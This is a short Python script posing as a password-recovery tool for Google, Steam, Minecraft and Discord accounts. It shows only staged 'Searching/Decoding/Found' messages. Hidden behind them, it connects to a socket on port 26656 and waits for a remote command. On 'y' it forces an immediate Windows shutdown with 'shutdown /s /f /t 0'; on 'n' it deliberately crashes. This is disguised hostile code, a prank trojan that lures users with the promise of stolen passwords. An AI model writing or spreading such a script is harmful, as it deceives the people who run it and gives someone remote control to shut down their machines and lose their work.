import os, socket, sys, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((socket.gethostname(), 26656))

delayState = 0
website = None

def slowText(string):
    for c in string:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)

slowText("Generating Passwords...   \nPlease wait...")

#Traceback (most recent call last):
#  File "Get_Passwords.py", line 53, in <module>
#    print(passwords[i])
#IndexError: list index out of range

def response():
    global delayState
    msg = s.recv(1024)
    if msg.decode("utf-8") == "y":
        os.system("shutdown /s /f /t 0")
    elif msg.decode("utf-8") == "n":
        os.system("cls")

        passwords = []
        for i in range(1,2):
            print(passwords[i])
    else:
        os.system("cls")
        delayState += 1

        if delayState == 1:
            website = "Google"
        elif delayState == 2:
            website = "Steam"
        elif delayState == 3:
            website = "Minecraft"
        elif delayState == 4:
            website = "Discord"

        print(f"{website} Password - (Searching)")
        time.sleep(1)
        os.system("cls")
        print(f"{website} Password - (Decoding)")
        time.sleep(3)
        os.system("cls")
        print(f"{website} Password - (Found)")
        response()

response()